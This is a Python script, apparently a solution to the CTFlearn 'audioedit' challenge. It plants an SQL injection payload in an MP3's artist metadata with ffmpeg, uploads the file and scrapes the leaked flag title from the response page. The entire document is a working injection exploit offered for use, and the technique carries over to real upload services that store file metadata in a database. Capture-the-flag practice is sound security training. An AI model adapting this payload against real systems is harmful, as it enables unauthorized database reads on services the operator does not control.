import requests, random, string, os

baseurl = "https://web.ctflearn.com/audioedit"
payload = "s',(SELECT title from audioedit as blah where file='supersecretflagf1le.mp3')) -- -"

# add random strings so that the file won't duplicate
ra = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))

# Place the payload
os.system(f"ffmpeg -i in.mp3 -metadata artist=\" {payload}\" -metadata title=\"{ra}\" out.mp3")
mp3_file = open("out.mp3", 'rb')

r = requests.post(baseurl + "/submit_upload.php", files={'audio':mp3_file}, allow_redirects=False)
os.system("rm out.mp3")

if 'location' in r.headers:
    r = requests.get(baseurl+r.headers['location'][1:])
    t = r.text.split('<h5>Title: <small>')
    t = t[1].split('</small>')
    k = t[0]
    print(k)
